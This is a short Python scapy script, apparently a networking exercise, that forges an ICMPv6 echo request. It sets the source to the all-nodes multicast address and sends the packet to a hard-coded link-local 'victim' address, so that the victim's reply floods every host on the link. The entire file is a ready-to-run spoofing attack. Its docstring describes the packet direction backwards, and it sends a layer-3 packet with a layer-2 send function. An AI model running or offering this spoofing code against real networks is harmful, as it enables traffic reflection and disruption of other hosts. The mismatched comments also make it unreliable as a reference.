from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest
from scapy.sendrecv import sendp


def build_fake_ping6(victim_ip, target_ip):
    """
    The function builds via scapy a fake ICMPv6 packet, from the victim to a specific target.
    :param victim_ip: victim's ip address
    :param target_ip: target's ip address
    :return: the fake built packet.
    """
    ipv6 = IPv6(src=target_ip, dst=victim_ip)
    icmpv6 = ICMPv6EchoRequest(id=1, seq=1, data='hey')
    return ipv6 / icmpv6


def send_fake_ping6(victim_ip, target_ip) -> None:
    """
    Sends the fake packet (ICMPv6 echo request).
    :param victim_ip: victim's ip address
    :param target_ip: target's ip address
    :return: None
    """
    fake_icmpv6_req = build_fake_ping6(victim_ip, target_ip)
    sendp(fake_icmpv6_req, verbose=0)


if __name__ == '__main__':
    # Victim's ip
    victim_ipv6 = "fe80::487c:ed58:ca1c:3dd8"

    # Group of all nodes
    group_ipv6 = "ff02::1"

    send_fake_ping6(victim_ip=victim_ipv6, target_ip=group_ipv6)
